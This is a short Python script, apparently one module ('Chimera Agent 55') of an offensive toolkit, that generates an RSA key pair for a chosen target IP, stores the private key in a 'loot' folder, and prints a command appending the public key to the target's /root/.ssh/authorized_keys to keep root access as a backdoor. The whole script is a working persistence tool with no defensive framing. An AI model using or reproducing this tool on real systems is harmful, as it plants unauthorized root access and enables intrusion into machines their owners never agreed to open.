import os
import sys
import subprocess

sys.path.append('/home/dan/Chimera_Project')
from core.db_handler import ChimeraDB

def run():
    db = ChimeraDB()
    os.system('clear')
    print("\033[96m" + "="*60)
    print("   CHIMERA AGENT 55 :: SSH KEY PERSISTENCE (GENIE)")
    print("="*60 + "\033[0m")

    target_ip = input("[?] Target IP: ").strip()
    key_name = f"/home/dan/Chimera_Project/loot/id_rsa_{target_ip}"
    
    print(f"[*] Generating custom persistence key for {target_ip}...")

    # 1. Generate Key Pair
    subprocess.run(["ssh-keygen", "-t", "rsa", "-b", "4096", "-f", key_name, "-N", ""])

    # 2. Extract Public Key for Injection
    with open(f"{key_name}.pub", "r") as pub_file:
        public_key = pub_file.read().strip()

    injection_cmd = f'echo "{public_key}" >> /root/.ssh/authorized_keys'
    
    print(f"[*] Persistence Prep Complete.\033[93m\nInjection Command:\n{injection_cmd}\033[0m")
    
    db.report_finding("55_SSH_Key_Genie", "SSH_Key_Generated", {
        "target": target_ip,
        "key_path": key_name,
        "status": "Ready"
    })

    db.close()

if __name__ == "__main__":
    run()
